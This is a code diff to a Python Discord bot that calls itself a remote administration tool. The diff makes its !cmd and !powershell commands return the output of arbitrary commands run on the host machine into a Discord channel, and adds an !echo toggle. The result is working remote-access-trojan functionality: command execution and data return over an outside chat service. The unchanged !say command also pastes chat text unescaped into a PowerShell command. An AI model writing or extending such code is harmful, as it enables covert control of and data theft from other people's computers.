@@ -21,6 +21,9 @@ client = Bot(description="A remote administration tool for discord", command_pre
 BOT_TOKEN = 'Enter Token Here'
 CHANNEL_ID = 'Enter Channel ID here'
 
+#Used by !echo(set) and !cmd/!powershell(get)
+display_output = True
+
 @client.event
 async def on_ready():
 	print('--------')
@@ -46,7 +49,9 @@ async def on_ready():
 @client.command()
 async def cmd(cmnd):
 	await client.say("Executing in command prompt: " + cmnd)
-	os.system(cmnd)
+	cmnd_result = os.popen(cmnd).read()
+	if display_output == True:
+		await client.say(cmnd_result)
 	await asyncio.sleep(3)
 
 
@@ -57,7 +62,9 @@ async def cmd(cmnd):
 @client.command()
 async def powershell(cmnd):
 	await client.say("Executing in powershell: " + cmnd)
-	os.system("powershell {}".format(cmnd))
+	cmnd_result = os.popen("powershell {}".format(cmnd)).read()
+	if display_output == True:
+		await client.say(cmnd_result)
 	await asyncio.sleep(3)
 
 
@@ -158,5 +165,22 @@ async def say(txt):
 	await client.say("Saying: " + txt)
 	os.system("powershell Add-Type -AssemblyName System.Speech; $synth = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak('" + txt + "')")
 	await asyncio.sleep(3)
+
+	
+# Module: echo
+# Description: Turns command output display to discord chat on and off (works for !cmd and !powershell)
+# Usage: !echo off or !echo on
+# Dependencies: None
+@client.command()
+async def echo(status):
+	global display_output
+	if status == "on":
+		display_output = True
+		await client.say("!cmd and !powershell output will be displayed in chat. ")
+	elif status == "off":
+		display_output = False
+		await client.say("!cmd and !powershell output will be hidden from chat. ")
+	else:
+		await client.say("Parameter of echo can be off or on. ")
 
 client.run(BOT_TOKEN)
